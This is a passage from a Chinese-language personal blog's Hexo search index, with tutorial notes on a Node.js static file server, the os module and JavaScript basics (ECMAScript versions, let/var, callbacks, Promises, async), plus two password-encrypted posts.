class="hljs-keyword">const</span> server = http.<span class="hljs-title function_">createServer</span>(<span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;    res.<span class="hljs-title function_">setHeader</span>(<span class="hljs-string">&#x27;content-type&#x27;</span>,<span class="hljs-string">&#x27;text/html;charset=utf-8&#x27;</span>);    <span class="hljs-keyword">let</span> url = <span class="hljs-keyword">new</span> <span class="hljs-title function_">URL</span>(req.<span class="hljs-property">url</span>, <span class="hljs-string">&quot;http://10.72.176.141:3000&quot;</span>);    <span class="hljs-keyword">let</span> filepath = __dirname + url.<span class="hljs-property">pathname</span>;    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(filepath);    fs.<span class="hljs-title function_">readFile</span>(filepath, <span class="hljs-string">&#x27;utf8&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">err, data</span>) =&gt;</span> &#123;        <span class="hljs-keyword">if</span> (err)&#123;            res.<span class="hljs-property">statusCode</span> = <span class="hljs-number">404</span>;            <span class="hljs-keyword">return</span>;        &#125;        res.<span class="hljs-title function_">end</span>(data);    &#125;)&#125;);server.<span class="hljs-title function_">listen</span>(<span class="hljs-number">3000</span>,<span class="hljs-string">&quot;10.72.176.141&quot;</span>,<span class="hljs-function">()=&gt;</span> &#123;    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Server running on port: &quot;</span> + server.<span class="hljs-title function_">address</span>().<span class="hljs-property">port</span>);&#125;);</code></pre></div><p>对于未知的资源类型，可以选择<code>application/octet-stream</code>类型，浏览器在遇到该类型的响应时，会对响应体内容进行独立存储，即下载该文件。</p><h3 id="错误处理"><a href="#错误处理" class="headerlink" title="错误处理"></a>错误处理</h3><div class="code-wrapper"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> http = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;http&#x27;</span>);<span class="hljs-keyword">const</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;fs&#x27;</span>);<span class="hljs-keyword">const</span> server = http.<span class="hljs-title function_">createServer</span>(<span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;    <span class="hljs-keyword">if</span>(req.<span class="hljs-property">method</span> !== <span class="hljs-string">&quot;GET&quot;</span>)&#123;        res.<span class="hljs-property">statusCode</span> = <span class="hljs-number">405</span>;        res.<span class="hljs-title function_">end</span>(<span class="hljs-string">&quot;&lt;h1&gt;405 Method Not Allowed&lt;/h1&gt;&quot;</span>);        <span class="hljs-keyword">return</span>;    &#125;    res.<span class="hljs-title function_">setHeader</span>(<span class="hljs-string">&#x27;content-type&#x27;</span>,<span class="hljs-string">&#x27;text/html;charset=utf-8&#x27;</span>);    <span class="hljs-keyword">let</span> url = <span class="hljs-keyword">new</span> <span class="hljs-title function_">URL</span>(req.<span class="hljs-property">url</span>, <span class="hljs-string">&quot;http://10.72.176.141:3000&quot;</span>);    <span class="hljs-keyword">let</span> filepath = __dirname + url.<span class="hljs-property">pathname</span>;    fs.<span class="hljs-title function_">readFile</span>(filepath, <span class="hljs-string">&#x27;utf8&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">err, data</span>) =&gt;</span> &#123;        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(err);        <span class="hljs-keyword">if</span> (err) &#123;            <span class="hljs-keyword">switch</span> (err.<span class="hljs-property">code</span>) &#123;                <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;ENOENT&#x27;</span>:                    res.<span class="hljs-property">statusCode</span> = <span class="hljs-number">404</span>;                    res.<span class="hljs-title function_">end</span>(<span class="hljs-string">&#x27;&lt;h1&gt;404 NOT FOUND&lt;/h1&gt;&#x27;</span>);                    <span class="hljs-keyword">return</span>;                <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;EACCES&#x27;</span>:                    res.<span class="hljs-property">statusCode</span> = <span class="hljs-number">403</span>;                    res.<span class="hljs-title function_">end</span>(<span class="hljs-string">&#x27;&lt;h1&gt;403 Forbidden&lt;/h1&gt;&#x27;</span>);                    <span class="hljs-keyword">return</span>;                <span class="hljs-attr">default</span>:                    res.<span class="hljs-property">statusCode</span> = <span class="hljs-number">500</span>;                    res.<span class="hljs-title function_">end</span>(<span class="hljs-string">&#x27;&lt;h1&gt;Internal Server Error&lt;/h1&gt;&#x27;</span>);            &#125;        &#125;        res.<span class="hljs-title function_">end</span>(data);    &#125;)&#125;);server.<span class="hljs-title function_">listen</span>(<span class="hljs-number">3000</span>,<span class="hljs-string">&quot;10.72.176.141&quot;</span>,<span class="hljs-function">()=&gt;</span> &#123;    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Server running on port: &quot;</span> + server.<span class="hljs-title function_">address</span>().<span class="hljs-property">port</span>);&#125;);</code></pre></div><h2 id="url模块"><a href="#url模块" class="headerlink" title="url模块"></a>url模块</h2><h2 id="os模块"><a href="#os模块" class="headerlink" title="os模块"></a>os模块</h2><div class="code-wrapper"><pre><code class="hljs stylus">os<span class="hljs-selector-class">.EOL</span>          <span class="hljs-comment">//显示操作系统的行尾标记</span>os<span class="hljs-selector-class">.arch</span>()          <span class="hljs-comment">//显示操作系统的CPU的架构</span>os<span class="hljs-selector-class">.platform</span>()          <span class="hljs-comment">//显示操作系统的平台类型   mac为darwin</span>os<span class="hljs-selector-class">.constants</span>          <span class="hljs-comment">//显示包含用于错误码、进程信号等的常用操作系统特定常量</span>os<span class="hljs-selector-class">.availableParallelism</span>()          <span class="hljs-comment">//返回程序应使用的默认并行度的估计值。默认线程数？</span>os<span class="hljs-selector-class">.cpus</span>()          <span class="hljs-comment">//显示每个逻辑 CPU 内核的信息的对象数组</span>os<span class="hljs-selector-class">.freemem</span>()          <span class="hljs-comment">//以整数形式返回空闲的系统内存量（以字节为单位）</span>os<span class="hljs-selector-class">.homedir</span>()          <span class="hljs-comment">//返回当前用户的主目录的字符串路径</span>os<span class="hljs-selector-class">.hostname</span>()          <span class="hljs-comment">//以字符串形式返回操作系统的主机名</span>os<span class="hljs-selector-class">.machine</span>()          <span class="hljs-comment">//以字符串形式返回机器类型</span>os<span class="hljs-selector-class">.networkInterfaces</span>()          <span class="hljs-comment">//返回包含已分配网络地址的网络接口的对象</span>os<span class="hljs-selector-class">.release</span>()          <span class="hljs-comment">//返回系统发行版本</span>os<span class="hljs-selector-class">.tmpdir</span>()          <span class="hljs-comment">//返回操作系统默认的临时文件的目录</span>os<span class="hljs-selector-class">.totalmem</span>()          <span class="hljs-comment">//以整数形式返回系统内存总量（以字节为单位)</span>os<span class="hljs-selector-class">.type</span>()          <span class="hljs-comment">//返回的操作系统名称，mac为Darwin</span>os<span class="hljs-selector-class">.version</span>()          <span class="hljs-comment">//返回操作系统内核版本</span></code></pre></div><h2 id="stream模块"><a href="#stream模块" class="headerlink" title="stream模块"></a>stream模块</h2><h2 id="events模块"><a href="#events模块" class="headerlink" title="events模块"></a>events模块</h2>]]></content>
    
    
    <categories>
      
      <category>编程技术</category>
      
      <category>NodeJS</category>
      
    </categories>
    
    
    <tags>
      
      <tag>NodeJS</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Jowto</title>
    <link href="/others/jowto/"/>
    <url>/others/jowto/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="密码错误" data-whm="Oh, these decrypted content cannot be verified, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="0f5b2d4920d6be5ee40e940a900dabe581ee310302f9d40cfaeae911cb5a1f6a"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">输入密码查看</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>others</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Jowto</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Python代码片段</title>
    <link href="/%E4%BB%A3%E7%A0%81%E7%89%87%E6%AE%B5/Python/"/>
    <url>/%E4%BB%A3%E7%A0%81%E7%89%87%E6%AE%B5/Python/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="密码错误" data-whm="Oh, these decrypted content cannot be verified, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="9207aebdbd60c83126aa462b0dd152b88237335f2e7a25f658f35dbeb5565c68">33c3996212b88ecec05d553659a5cbad5574fa3f1b0749bd19a29001b4699d5ad6d474a90f0022bc6c802e9b8cdcd6af21fc8131a7d5b74b87a46f3dd1bb48dbfb7244617b684d4112784e3f29181f95bc2f4378e87d932905c647371b338087bdb7b938724dedc21fa11b894f1bcae1ceb4286542475c525dadd8f3eb3fb1379a7d6cd64eac1f0910f0d1350b5209a553dc75fac2c5337c8b5b295918b651465aa47505b477173e80e5a1f79196e6c16b38663dffb9b1c71c3e9f14fe16001b247d50f0f6cab02cdef9ae1c9e6bbf330d8e857fed2675dbbcf6d6bdf8aff13d086ba4a7a08e16a6a9bbe284ea1a8e95c3916ea1ab79341e37072519af093dcf754bf664a3fd46fbf57dec5d84a08abb9aa910fa785d7391d30c79bc398c643ef95472bf8f7ea54e695d2868a53c2500fd47647d93a2b6bfcce3799c8bb78b6540041c541ddf509bbe99c13127fb807adac57558590f87c53d22537df333b678f9766e26166685324c7ee5851979cf87b999c1d1588a8c1220479362103166642f817ecd49ba7a22fa60d49d5e2a10a03d9a0b5f2cdfa33c5bdc29e6486e240f843b7040dcd593b7cd57ec14428577b30499ea31173fefcd80c20b769fd1635f8cb8db28248ba36ab16fcc25d076cd3d75b10f35948464265d5fec07495ed485b9c6e5621c9a656ce3e82d41c795c64ccd9547bbd941b496b0e2595662fc7490efbfb057092fbb3deb3ba426e909cc21234034c30e26d9d9994e14d1ec5d457fe1740a9d4ad33a8df112679f17339737dd64ce82fe2bc6619e0f4562aea36209b7a3281fca9713505017e3232aa0018e75c7fc1cda610cec92d64cd5aa360a4a45807bb595abf597ad62aa021c28d951c7ae1df2f0404fd8933aee1432776b3634c35a9a1e0667aa8dd33344137b0c94155dc34df40a454ceec056b80ce80867d6ceb92abd68acc7d5ba76fa0ddaf9456d7f31294df2babe21642fce84b76b8bb28c9c09570d31dfb88c20744b3a3d293de1b8a8ebb59fcef5b4b3ff848564e65ccb2fd77a7132ea5644f8e5e09920b2bf6a6622615b27892a00a78f881406f41ca265df5ab2c229b8f93967382347ec23909e2b3645fc8fefb26b1127a3fd0a17937d456ad909ca899de42d76eb9153d8175fd2e5b7ad17c6d7af44efd018aa22ae02e50f206e5b26de7c361c294c03b3a3521bed8ac03eaeedd0cc521534300a56b09a6be7368cd46fd4e0aa22c00c9471e18130da65dc0c507f4b3a593d500f23014e93cf895ad5ef458a89c9e7aef08dbcea964c8b56283f00fcaaab9dec3b3f1703618d4330057fd716299abd36d8554405e7cf887709c06040cb19bb7ff52131edebfc76606dbd759997cde4cabc021381a7871d8dc34c6280fb586a522d757dbc1b24df58614069ede5ec0bcd7b5267135019a555c34f0557852012f2123f2d730adf667e23a8f18fa2d6079c6d201497e97e2a0525fb9772a2a08bd064cbf097d506952507b4c939e6acbb85280ad4e4527cbb70ceb963a6f619056e33f99683681a20d73b0bb75936f19e99ef516ed56cd2123787ad78a8a88c1d3c0d21fa08a20afb74c9d6c7eddb867b628bc8b94af7470375bc731b9730fdd78158a814a6b04bd1fec37ed60b6c091d27889dcf0e414732b584dfaffbcd904129ab895503c219707baeb80d5ddd9cfcfe8b396303eada31787d8124feb043fbee874b8c2e6a72845f820e3a7a44af3645f96f07b923ae8f665f3213b39502ac0a676ac4d4a5e5e1d812fa59c5f54786853a2bf6ddb37bda550d6c96d1ea3515710fa4067511673b715a0df3f49e928fba8c7f0967cfe65c1289274e6aa6ee4ad53d38f7ba8c8698fce256263cd5dae2997e280a421375a9b98eeff47d9a03ff965c5dc7b297d96eb463c16849dd477349c20602a4164a2bd1f6f82c8f08d14f33ba36b1f9aa7ad6c4e2c3e8d3ba61b2b8e0362286e187b1464a99834fad45c7707ab8c39de5137503236d9e200fbcbde97e39b7360e6815ea8d50cd7744deaa0a41514f0eeb93cf478406c8c1e0dfefd7e04a85d8e5c655da6769442315ec6ec644910932004ab96e684e7c361e6aea1ac486283bc83edf2de255283d7672ae40f08b626b1d0b004cf6aa2dc4368241c0890f4bbdff0134b34b960a631bb1c47e65115864f95834db99f438b00b78113faf374098b1a3c7a0440d659e35b6e4962ea0e8dbf0fb411f3c9266469f0ab88c660e5968a9e4e0e0931168a04e5608b1be2a5f9b5da8cb8de57827a6fd6c46fe66612c74598d658d4b5ac2932e296c77dabb6f16caa2db6db445dc4bd53629021cd54a5c874e8f954aeacadbacf6f97fbd98701662d239cbc9b4d2b6b8c0627f52b06539417a3c5dba1fb8bfcced4fb56a8f99ddd90b1e91ef6749caad7e35f31b6eee390499a69fc5d55d98183ee7286fa22497e708ae3f232df866ff3cef40dddb0bed3ce6b34ba1542ab2c6b331128d2819f48121ed1974ab74436147e2f671c2d4121555db9b611caf71a8714f26525b9abcdcf5e9141952dfef73e7343caa6ccb310383415de2340426049224b10ef556fb43680b611b78a4601c767a04d71219ad4d93dcc6ff6e645be04e53818e57eb50dda91444262b0811fd094fc38861d62e2c1ea4f4eae9ccc279e9214f41e0303d73e920aa895f734c81e4e90216dffb367ec6107038f631c83e2f37ee567e97f6115321c5bc0f156acf99415f30d28a995f67c12995c0597d2fbb8299c660f7c11b211e918814b62cb24dab4ee845c537c63ec8c8695564e65bd7646336230d948df56ab2cbdde55bc8893646a66e392d3a41c2c1cf573b077da8a9f4eaa9721d2ad01dc76c5f86b41cb89033343f4618d569273722de610b811fd450ebc494a8b39d6f06dcb59d15c40f97761d08b91a05d16419b2e5e3026387e5f9690436601a458df9b68831d85b76dff741abcf9d01db5de1b047af0cfe90ee30d0388d0c83e15f8e397fb64e9a4e613ef577c9c3bd28540cf34303653ba8bd5a739d294a62aa4c0e456a35c064420fda98b0c8019351d206e1e715b2a8e088590b906d8f17bbef417a385ae9a5fb67b0c5df6dc07556b923a06b35071b85dad43f7b026f0548a066f930d3c3543105ebacdd1eb0aab77cffea4d98a72d2564661e0925c1309e468c7878f5c03b44b1231d4b20159735ab16a6e8bda4caa3dab77d3ecb33f23d88eefccacfe5ff2ed5b2a4faedea2bca8a1b53d0e5799da9cd22f7c821a77e511dd3cd43dc654cc8b66dd8394e255f238656e29cde642c12f21b95b613f5dc6e83a874c68763897d069f65310d41b24b291a09b3bb744ff80f6a281eb398766d170ab0b40af71b94b323c2a86bb5f95313b0d67351e04a4a2bbf60c139c3eb347aaf08b92903514c25fa40ae832fb16c80ec32b0513edd63c2d27a08a5d5aaa9455a5dcf0536f90d924d6e8e8c1329778516f269293183402bc9dffaf643530072b88a26153c5e2a052cc32921849792e6c1f9613e8aca9cbf0f127d008c1294910d9709a7072d1ba24790487c8aaa224bbebd1c6882067ff1bf0dc56a7fa2e6a46202d326898ae59ec489aeb52c0c39fcab34aae0ebf132dfa5a10b7c3f1c28297f5449eb939968274e099c6eaab0bcb7e04d1caa2285b3f01fbd9a7678597961a6e7946df925efb852423906e66e1938e5709131e0d04c89add249d188a1da77af04014bfe499282874e8929ae402276302c10b4e45671408e045d89e07554a7e2b582bb24ba2508db1a19989e56c1d2be2ea46fbb8eab08873f9855c3479fde49be7e438cf4b944c8c52af93d50811ca2a016cb58ba36f7d51047c0038652a6837fa4bcad9c6d7538edac7be5571c0f4a28dc8b5475103826d4293b71d0f207ba82466ec17d642659e55aa852d822bbe27602f5fcc095ff21f3ff463fb97828036a27694a019bf7dc13269371f666a3198ac6f6c8218c0c3d04e293f2bea260845996d909052cc4438aedea35c684eaeaf501bc5a9fe2624b696b1292bed725e4e0451d6fe6354617a17e9cf6450e34e151c1710cdbdf6b66c7951487e1d799140590a10956de874ef05c106038f5db0f1d68fea15e77dc865e390a2e0f8062f1e1fa15e6b3de32ead741a0c45876effe9651d9e6745f8efafa9160912bc7b5769f173ed7c5ec39b374bd60f1c1f1a93687489477d1f4d1ffe802b271e6e9941cd50527fe1936daa68ad4cc44305bb80d1c65220dfdd1ede701037e62f4770657132fe52f5f93414eb5e2b5f3fe399aa07f6e87f9ee6286e97849bab04f017ef4e4e4e8c02133574a7b89055fb19cfe71cb187d1855edc71d748dacfe7a505f93629bc7203ec4ce2447e712a737502b3e78d6be0ee8bf373d0d5c13ca33f1c2d257ce7d94cf6a722d302b18abb60c09cf7320a7516ff700200148afcd83e0e0328b45473f026b1e0aeb6f49a062a065ed9929ed3880b9d841902bd773d1f230f4e1dd4d2b95c761ef12b1cdaa77dbec85c61740940b540cb82e1286177ae1b80ff6beeaa8b5238991ad541b596a8989db6f31dea61a3d677122fff4ae8eaf0a468ddb9d92d9119c1598df6b9ee6b8e379f2bf0b9e190b3abbbf2b276663547d1921eb2571d102cf9a666334b86f7b5a5d81144e9142bfb0bcf1666d513d3722d69c0043999d461664256a21770c9a267bdb848ee82dbccb39092e944557bed6dbb651201dc4870455a62c102397ffb7cc47e34be7da49e855d908d14ab193544fc91c0faf72e02f4ce25258e73eafed83b73ad6dc530cb8efeff3c2f31588cc85eb6e03a604b84f2d7df3165bc31eb4c0b29dc724b1075898</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">输入密码查看</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>代码片段</category>
      
      <category>Python</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Encryption</tag>
      
      <tag>Python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>JavaScript</title>
    <link href="/%E7%BC%96%E7%A8%8B%E6%8A%80%E6%9C%AF/JavaScript/JavaScript/"/>
    <url>/%E7%BC%96%E7%A8%8B%E6%8A%80%E6%9C%AF/JavaScript/JavaScript/</url>
    
    <content type="html"><![CDATA[<h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><h2 id="ECMAScript"><a href="#ECMAScript" class="headerlink" title="ECMAScript"></a>ECMAScript</h2><p>ECMAScript是一种脚本程序设计语言的标准化规范，由 Ecma 国际组织制定。JavaScript是这种规范的实现和扩展。</p><h3 id="历史发展"><a href="#历史发展" class="headerlink" title="历史发展"></a>历史发展</h3><p>自1997年发布第一版以来，ECMAScript 经历了多次更新。最著名的是 <code>ECMAScript 5</code>（ES5，2009年发布）和 <code>ECMAScript 6</code>（ES6，2015年发布）。</p><h3 id="主要特性"><a href="#主要特性" class="headerlink" title="主要特性"></a>主要特性</h3><p><strong>ES5 特性</strong></p><ul><li>严格模式（Strict Mode）：提供更严格的错误检查，帮助避免常见错误。</li><li>JSON 支持：原生支持 JSON 解析和序列化。</li><li>函数增强：如 <code>Function.prototype.bind</code>。</li><li>数组方法：如 <code>forEach</code>、<code>map</code>、<code>filter</code>、<code>reduce</code> 等。</li><li>对象属性控制：通过 <code>Object.defineProperty</code> 等方法更细粒度控制对象属性。</li></ul><p><strong>ES6 特性</strong></p><ul><li>类（Classes）和模块（Modules）。</li><li>箭头函数（Arrow Functions）：简化函数定义的语法。</li><li>模板字符串（Template Strings）：用于字符串插值。</li><li>解构赋值（Destructuring Assignment）。</li><li>Promises：用于异步编程。</li><li>增强的对象字面量（Enhanced Object Literals）。</li><li>块级作用域构造（如 <code>let</code> 和 <code>const</code> 关键字）。</li><li>迭代器（Iterators）和生成器（Generators）。</li><li>新的数据结构，如 <code>Map</code>、<code>Set</code>、<code>WeakMap</code> 和 <code>WeakSet</code>。</li></ul><p><strong>后续版本（ES2016及以后）</strong></p><ul><li>异步函数（Async Functions）。</li><li>展开操作符（Spread Operator）和剩余参数（Rest Parameters）。</li><li>新的内置方法和小的语言改进。</li></ul><h2 id="基础语法"><a href="#基础语法" class="headerlink" title="基础语法"></a>基础语法</h2><h3 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h3><div class="code-wrapper"><pre><code class="hljs actionscript"><span class="hljs-comment">// 单行注释</span><span class="hljs-comment">/*  多行注释  */</span></code></pre></div><h3 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h3><p>变量的声明</p><div class="code-wrapper"><pre><code class="hljs actionscript"><span class="hljs-keyword">const</span>：声明一个块作用域的只读常量。</code></pre></div><p>let</p><p>声明一个块作用于的局部变量，可选初始化一个值。使用范围：块级作用域。如if判断语句、for循环体内</p><div class="code-wrapper"><pre><code class="hljs arcade">&#123;    let a = <span class="hljs-number">10</span>;    <span class="hljs-keyword">var</span> b = <span class="hljs-number">1</span>;&#125;<span class="hljs-built_in">console</span>.<span class="hljs-built_in">log</span>(a);  <span class="hljs-comment">//ReferenceError: a is not defined</span><span class="hljs-built_in">console</span>.<span class="hljs-built_in">log</span>(b);  <span class="hljs-comment">//1</span><span class="hljs-keyword">for</span> (let i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">5</span>; i++) &#123;    <span class="hljs-built_in">console</span>.<span class="hljs-built_in">log</span>(i);   <span class="hljs-comment">//  0 1 2 3 4 </span>&#125;<span class="hljs-built_in">console</span>.<span class="hljs-built_in">log</span>(i);   <span class="hljs-comment">//ReferenceError: i is not defined</span></code></pre></div><p>var</p><p>声明一个变量，可选初始化一个值。  使用范围：函数作用域和全局作用域。</p><div class="code-wrapper"><pre><code class="hljs"></code></pre></div><p>var和let的区别</p><ul><li>var声明的变量可在声明前使用，值为<code>undefined</code></li><li>let声明的变量续在声明后使用，否则会报错</li></ul><div class="code-wrapper"><pre><code class="hljs arcade"><span class="hljs-built_in">console</span>.<span class="hljs-built_in">log</span>(a);   <span class="hljs-comment">//undefined</span><span class="hljs-keyword">var</span> a = <span class="hljs-number">1</span>;<span class="hljs-built_in">console</span>.<span class="hljs-built_in">log</span>(b);  <span class="hljs-comment">//ReferenceError: Cannot access &#x27;b&#x27; before initialization</span>let b =<span class="hljs-number">1</span>;</code></pre></div><p><strong>块级作用域</strong></p><h3 id="语句"><a href="#语句" class="headerlink" title="语句"></a>语句</h3><div class="code-wrapper"><pre><code class="hljs abnf">在javascript中每个语句需要以分号结尾var name <span class="hljs-operator">=</span> <span class="hljs-string">&quot;test&quot;</span><span class="hljs-comment">;</span></code></pre></div><h3 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h3><p>函数定义</p><div class="code-wrapper"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">square</span>(<span class="hljs-params">number</span>) &#123;  <span class="hljs-keyword">return</span> number * number;&#125;<span class="hljs-keyword">const</span> result = <span class="hljs-title function_">square</span>(<span class="hljs-number">4</span>)<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(result)</code></pre></div><p>函数表达式</p><div class="code-wrapper"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> square = <span class="hljs-keyword">function</span> (<span class="hljs-params">number</span>) &#123;  <span class="hljs-keyword">return</span> number * number;&#125;;<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">square</span>(<span class="hljs-number">4</span>));</code></pre></div><h3 id="对象"><a href="#对象" class="headerlink" title="对象"></a>对象</h3><p>JavaScript也支持对象</p><h3 id="回调"><a href="#回调" class="headerlink" title="回调"></a>回调</h3><p>将函数作为参数传递给其他函数</p><div class="code-wrapper"><pre><code class="hljs arcade"><span class="hljs-keyword">function</span> <span class="hljs-title function_">myDisplayer</span>(<span class="hljs-params">some</span>) &#123;    <span class="hljs-built_in">console</span>.<span class="hljs-built_in">log</span>(some);&#125;<span class="hljs-keyword">function</span> <span class="hljs-title function_">myCalculator</span>(<span class="hljs-params">num1, num2, myCallback</span>) &#123;    let <span class="hljs-built_in">sum</span> = num1 + num2;    myCallback(<span class="hljs-built_in">sum</span>);&#125;myCalculator(<span class="hljs-number">5</span>, <span class="hljs-number">5</span>, myDisplayer);</code></pre></div><p>回调最常与异步函数一起使用。</p><h3 id="异步"><a href="#异步" class="headerlink" title="异步"></a>异步</h3><p>与其他函数并行运行的函数称为异步（asynchronous）</p><p>等待超时</p><div class="code-wrapper"><pre><code class="hljs arcade">setTimeout(<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123; myFunction(<span class="hljs-string">&quot;I love You !!!&quot;</span>); &#125;, <span class="hljs-number">3000</span>);<span class="hljs-keyword">function</span> <span class="hljs-title function_">myFunction</span>(<span class="hljs-params">value</span>) &#123;    <span class="hljs-built_in">console</span>.<span class="hljs-built_in">log</span>(value)&#125;</code></pre></div><p>等待间隔</p><div class="code-wrapper"><pre><code class="hljs javascript"><span class="hljs-built_in">setInterval</span>(myFunction, <span class="hljs-number">1000</span>);<span class="hljs-keyword">function</span> <span class="hljs-title function_">myFunction</span>(<span class="hljs-params"></span>) &#123;    <span class="hljs-keyword">let</span> d = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>();    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(d.<span class="hljs-title function_">getHours</span>() + <span class="hljs-string">&quot;:&quot;</span> + d.<span class="hljs-title function_">getMinutes</span>() + <span class="hljs-string">&quot;:&quot;</span> + d.<span class="hljs-title function_">getSeconds</span>());&#125;</code></pre></div><p>等待文件</p><p>如果您创建函数来加载外部资源（如脚本或文件），则在内容完全加载之前无法使用这些内容。这是使用回调的最佳时机。</p><h2 id="Promise对象"><a href="#Promise对象" class="headerlink" title="Promise对象"></a>Promise对象</h2><p>“I Promise a Result!”</p><p>“Producing code（生产代码）” 是需要一些时间的代码</p><p>“Consuming code（消费代码）” 是必须等待结果的代码</p><p>Promise 是一个 JavaScript 对象，它链接生成代码和消费代码</p><p>语法</p><div class="code-wrapper"><pre><code class="hljs javascript"><span class="hljs-keyword">let</span> myPromise = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">myResolve, myReject</span>) &#123;<span class="hljs-comment">// &quot;Producing Code&quot;（可能需要一些时间）</span>  <span class="hljs-title function_">myResolve</span>(); <span class="hljs-comment">// 成功时</span>  <span class="hljs-title function_">myReject</span>();  <span class="hljs-comment">// 出错时</span>&#125;);<span class="hljs-comment">// &quot;Consuming Code&quot; （必须等待一个兑现的承诺）</span>myPromise.<span class="hljs-title function_">then</span>(  <span class="hljs-keyword">function</span>(<span class="hljs-params">value</span>) &#123; <span class="hljs-comment">/* 成功时的代码 */</span> &#125;,  <span class="hljs-keyword">function</span>(<span class="hljs-params">error</span>) &#123; <span class="hljs-comment">/* 出错时的代码 */</span> &#125;);</code></pre></div><div class="code-wrapper"><pre><code class="hljs javascript"><span class="hljs-keyword">let</span> myPromise = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">myResolve, myReject</span>) &#123;    <span class="hljs-built_in">setTimeout</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123; <span class="hljs-title function_">myResolve</span>(<span class="hljs-string">&quot;I love You !!&quot;</span>); &#125;, <span class="hljs-number">3000</span>);&#125;);myPromise.<span class="hljs-title function_">then</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">value</span>) &#123;    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(value);&#125;);</code></pre></div><h2 id="JavaScript-Async"><a href="#JavaScript-Async" class="headerlink" title="JavaScript Async"></a>JavaScript Async</h2><p>async使函数返回Promise，await使函数等待Promise</p><p><strong>Async 语法</strong></p><p>函数前的关键字 <code>async</code> 使函数返回 promise</p><p><strong>Await 语法</strong></p><p>函数前的关键字 <code>await</code> 使函数等待 promise。<code>await</code> 关键字只能在 <code>async</code> 函数中使用。</p><h2 id="Fetch-API"><a href="#Fetch-API" class="headerlink" title="Fetch API"></a>Fetch API</h2><p>Fetch 基于 async 和 await</p><p>Service Worker中大量使用Fetch API</p><p>Fetch是基于Promise的，使用了异步特性</p><h2 id="XMLHttpRequest"><a href="#XMLHttpRequest" class="headerlink" title="XMLHttpRequest"></a>XMLHttpRequest</h2><h1 id="重点掌握"><a href="#重点掌握" class="headerlink" title="重点掌握"></a>重点掌握</h1><ul><li>ECMAScript 基本语法</li><li>DOM编程</li><li>BOM的使用</li><li>作用域、闭包、原型链</li><li>事件代理&#x2F;委托</li><li>错误处理&#x2F;异常处理</li><li>事件队列 (setTimeout&#x2F;setInterval&#x2F;Promise)</li><li>JSON</li><li>Ajax&#x2F;Fetch</li><li>ES6+</li><li>正则表达式</li></ul><h1 id="note"><a href="#note" class="headerlink" title="note"></a>note</h1><p><strong>script标签</strong></p><ul><li><p>在html页面中使用javascript代码需要使用<code>&lt;script&gt;&lt;/script&gt;</code>标签</p></li><li><p><code>&lt;script&gt;</code>标签一般放在html文档的<code>head</code>和<code>body</code>标签内，一般在<code>head</code>标签内定义函数，在body中引用</p></li><li><p>在<script>标签内可引用外部js文件</p></li></ul><p><strong>JavaScript 